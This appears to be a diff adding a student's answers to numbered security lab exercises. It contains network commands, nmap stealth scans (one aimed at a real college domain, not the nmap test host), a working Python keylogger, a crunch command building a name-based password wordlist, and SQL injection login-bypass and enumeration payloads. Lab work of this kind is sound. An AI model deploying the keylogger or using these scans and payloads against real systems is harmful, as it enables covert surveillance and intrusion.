@@ -1,0 +1,35 @@
+3.a
+ifconfig
+ping 192.168.1.1, ping 203.192.253.1
+netstat
+tracert www.lexis.com
+
+4.
+ACK: nmap -sA -T4 scanme.nmap.org
+SYN: nmap -p22,113,139 scanme.nmap.org
+FIN: nmap -sF -T4 bhavans.ac.in
+NULL: nmap -sN -p22 scanme.nmap.org
+XMAS: nmap -sX -T4 scanme.nmap.org
+
+6.
+from pynput.keyboard import Key,Listener
+import logging
+log_dir=""
+logging.basicConfig(filename=(log_dir+"KEY LOGGER.txt"),level=logging.DEBUG,format='%(asctime)s:%(message)s:')
+def on_press(key):
+    logging.info(str(key))
+with Listener (on_press=on_press) as listener:
+    listener.join()
+
+7.b
+search Crunch and type cd Desktop
+crunch 10 10 279! -t AmitKahar@ -o list.txt
+head list.txt
+
+9.
+1
+'
+'or'1'='1
+'union select 1,@@version#
+'union all select system_user(),user()#
+
